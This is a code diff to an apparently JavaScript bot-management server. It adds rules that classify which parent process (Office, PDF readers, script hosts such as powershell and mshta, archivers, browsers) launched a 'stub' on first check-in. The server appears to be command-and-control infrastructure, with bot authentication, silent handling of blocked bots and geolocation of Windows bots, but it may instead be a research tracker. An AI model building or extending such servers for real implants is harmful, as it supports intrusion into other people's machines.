@@ -31,16 +31,50 @@ router.get("/ping", (req, res) => {
   res.send("OK");
 });
 
+// Parent process name → detection rule mapping
+// Matches what full_stub.cpp reports in the pname= info field
+const PARENT_RULES = [
+  { patterns: ["winword","excel","powerpnt","msaccess","mspub","onenote","outlook"], rule: "PROC_PARENT_OFFICE"  },
+  { patterns: ["acrord32","acrobat","foxitreader","sumatrapdf","pdfxview"],          rule: "PROC_PARENT_PDF"     },
+  { patterns: ["mshta","wscript","cscript","powershell","cmd"],                      rule: "PROC_PARENT_SCRIPT"  },
+  { patterns: ["winrar","7z","7zfm","winzip","peazip","bandizip"],                   rule: "PROC_PARENT_ARCHIVE" },
+  { patterns: ["chrome","firefox","msedge","iexplore","opera","brave","vivaldi"],    rule: "PROC_PARENT_BROWSER" },
+];
+
+function parentRule(pname) {
+  if (!pname) return null;
+  const n = pname.toLowerCase().replace(/\.exe$/, "");
+  for (const entry of PARENT_RULES) {
+    if (entry.patterns.some(p => n === p || n.startsWith(p))) return entry.rule;
+  }
+  return null;
+}
+
 router.get("/checkin", (req, res) => {
   if (!botAuthed(req)) return res.status(403).send("");
   const id = req.query.id, info = req.query.info || "";
   if (!id) return res.status(400).send("");
   // Silently ignore blocked bots — don't update state, don't log
   if (_bots[id]?.blocked) return res.status(200).send("");
-  const bot    = getOrCreate(id);
-  bot.info     = info;
-  bot.lastSeen = new Date().toISOString();
+  const bot      = getOrCreate(id);
+  const firstSeen = !bot.info;
+  bot.info       = info;
+  bot.lastSeen   = new Date().toISOString();
   recordNetlog(bot, req, res, 0);
+
+  // On first checkin: parse parent process name and fire carrier-delivery detection
+  if (firstSeen) {
+    const pnameMatch = info.match(/(?:^|\|)pname=([^|]+)/);
+    const pname = pnameMatch ? pnameMatch[1].trim() : "";
+    const rule  = parentRule(pname);
+    if (rule) {
+      const ev = { rule, ev: "carrier_parent_proc", pname, sev: "high", received: new Date().toISOString() };
+      bot.events.push(ev);
+      runDetection(bot, ev);
+      computeRiskScore(bot);
+      console.log(`[carrier] bot=${id}  pname=${pname}  rule=${rule}`);
+    }
+  }
 
   // IP geolocation for Windows bots (fire-and-forget, city-level only)
   if (!bot.lastLoc) {
